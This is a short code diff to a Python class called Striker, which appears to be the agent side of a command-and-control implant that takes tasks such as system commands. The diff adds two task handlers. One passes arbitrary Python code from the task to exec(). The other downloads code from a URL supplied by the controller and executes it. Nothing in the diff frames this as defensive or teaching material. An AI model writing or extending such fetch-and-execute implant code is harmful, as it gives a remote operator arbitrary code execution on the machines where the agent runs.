@@ -166,7 +166,7 @@ class Striker:
       data = task['data']
     except KeyError:
       pass
-    result = "Not implemented!"
+    result = "";
     if (task["taskType"] == "system"):
       cmd = data['cmd']
       if self.os == "windows" and not cmd.startswith("cmd /c "):
@@ -265,6 +265,24 @@ class Striker:
         result = "Abort signal set for task: " + targetID
       else:
         result = "Invalid task: " + targetID
+    elif (task["taskType"] == "pyexec"):
+      try:
+        exec(data["code"])
+        successful = 1
+      except Exception as e:
+        result = "Error running code: " + str(e)
+    elif (task["taskType"] == "pyexec-web"):
+      status, body = self.httpGet(data["url"])
+      if (status == 0):
+        result = "Error fetching code: " + body
+      else:
+        try:
+          exec(body)
+          successful = 1
+        except Exception as e:
+          result = "Error running code: " + str(e)
+    else:
+      result = "Not implemented!"
     task["result"] = {"uid":taskID, "result":result, "successful": successful}
     task["finished"] = True
     return
